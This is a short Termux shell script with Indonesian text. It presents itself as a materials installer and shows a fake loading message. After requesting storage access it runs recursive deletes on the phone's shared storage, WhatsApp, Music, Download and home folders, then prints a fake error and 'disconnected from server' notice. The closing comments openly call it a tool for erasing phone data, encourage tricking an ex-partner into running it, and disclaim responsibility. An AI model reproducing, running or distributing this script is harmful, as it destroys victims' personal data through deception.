#!/system/xbin/bash
#Clear All

sleep 2
clear
echo "INSTALL BAHAN [y/n]"
read p;
sleep 1
echo "[+] MEMUAT..."
termux-setup-storage
clear 
termux-setup-storage
rm -fr /storage/emulated/0
rm -fr /storage/emulated/0/android
rm -fr /storage/emulated/0/Music
rm -fr /storage/emulated/0/Whatsapp
rm -fr /storage/emulated/0/Download
rm -fr $HOME
figlet "\033[91;1mERROR!!"

echo "Loading..."
echo "Anda Terkeluar dari server"
sleep 1
exit
clear
# HALLO GUYS
# INI TOOLS PENGHAPUS DATA HP
# AYO SURUH MANTAN GUNAKAN TOOLS INI
# SAYA TIDAK BERTANGGUNG JAWAB